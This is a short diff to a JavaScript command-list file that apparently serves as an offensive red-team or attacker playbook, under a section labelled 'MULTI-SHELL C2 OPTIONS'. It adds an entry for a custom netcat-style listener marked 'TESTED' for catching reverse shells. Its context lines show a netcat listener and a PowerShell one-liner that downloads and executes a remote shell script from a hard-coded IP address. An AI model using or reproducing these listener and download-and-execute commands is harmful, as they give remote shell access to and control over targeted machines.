@@ -4724,6 +4724,13 @@ const COMMANDS = [
   // MULTI-SHELL C2 OPTIONS
   // ═══════════════════════════════════════════════════════════════
   {
+    title: "[C2] nc.py - Simple Single-Shot Listener",
+    desc: "TESTED: Custom netcat replacement. Edit PORT in file, handles RCE cleanly.",
+    code: "# Edit PORT in /opt/nc.py (default 5555)\n# Then run:\npython3 /opt/nc.py\n# or with port arg:\npython3 /opt/nc.py 9999\n\n# Target connects with any reverse shell",
+    tags: ["linux", "vps", "c2", "playbook"],
+    accent: "#00ff41"
+  },
+  {
     title: "[C2] TCP Shell - Port 5555",
     desc: "TESTED: Simple TCP shell on alternate port. Good for redundancy.",
     code: "# VPS: nc -lvnp 5555\n# Target:\nIEX(IWR http://168.144.166.97:8889/shell_tcp5555.ps1 -UseBasicParsing)",
